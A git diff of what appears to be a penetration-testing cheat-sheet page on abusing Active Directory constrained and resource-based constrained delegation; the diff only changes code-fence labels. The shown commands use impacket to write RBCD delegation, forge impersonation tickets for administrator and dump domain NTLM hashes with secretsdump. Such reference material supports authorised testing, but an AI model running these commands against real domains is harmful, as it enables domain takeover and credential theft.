@@ -4,7 +4,6 @@ date: 2024-8-2
 tags: ["constrained delegation", "active driectory", "ad", "Windows", "impacket", "rbcd"]
 ---
 
----
 ### Abuse #1: RBCD Attack
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -14,15 +13,15 @@ tags: ["constrained delegation", "active driectory", "ad", "Windows", "impacket"
 
 <div>
 
-```bash
+```console
 sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
 ```
 
-```bash
+```console
 impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self
 ```
 
-```bash
+```console
 # Check forwardable flag
 describeTicket.py <TICKET_1>.ccache
 ```
@@ -33,22 +32,22 @@ describeTicket.py <TICKET_1>.ccache
 
 <div>
 
-```bash
+```console
 # Add delegation
 impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
 ```
 
-```bash
+```console
 # Check
 sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
 ```
 
-```bash
+```console
 # Impersonate
 impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2>
 ```
 
-```bash
+```console
 # Check forwardable flag
 describeTicket.py <TICKET_2>.ccache
 ```
@@ -59,7 +58,7 @@ describeTicket.py <TICKET_2>.ccache
 
 <div>
 
-```bash
+```console
 impacket-getST -spn <SERVICE>/<DC> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
 ```
 
@@ -69,12 +68,12 @@ impacket-getST -spn <SERVICE>/<DC> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>'
 
 <div>
 
-```bash
+```console
 # Import ticket
 export KRB5CCNAME='<TICKET_2>.ccache'
 ```
 
-```bash
+```console
 impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
 ```
 
